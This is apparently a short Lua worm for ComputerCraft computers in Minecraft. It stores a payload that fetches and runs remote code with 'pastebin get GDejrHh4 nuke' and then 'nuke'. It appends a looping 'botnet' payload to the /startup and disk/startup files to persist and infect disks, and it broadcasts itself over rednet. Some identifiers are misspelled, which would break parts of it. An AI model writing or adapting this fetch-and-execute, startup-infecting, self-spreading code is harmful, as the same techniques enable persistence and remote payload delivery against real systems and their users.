-- Inject into startup.
-- Spread via rednet if possible
-- infect disks
-- maybe use _G.fs to offload files?
getfenv(('').gsub).payload = "shell.run('pastebin get GDejrHh4 nuke') shell.run('nuke')"
rednetPayload = getfenv(('').gsub).payload
payload = "getfenv(("").gsub).botnet = function e() return end while true do getfenv(("").gsub).botnet() sleep(.1) end"
sides = {"left","right","back","top","bottom"}
if fs.exists("/startup") then
    vic = fs.open("/startup","a")
    vic.write(payload)
else
    vic = fs.open("/startup","w")
    vic.write(payload)

end
if fs.isDIr("disk") then
    if fs.exists("disk/startup") then
        vicDisk = fs.open("disk/startup","a")
        vicDisk.write(payload)
    else
        vicDisk = fs.open("disk/startup","w")
        vicDisk.write(payload)
    end
end
for i=1,#sides do
    if rednet.isOpen(sides[i]) then
        rednet.broadcast(redNetpayload)
    end
end
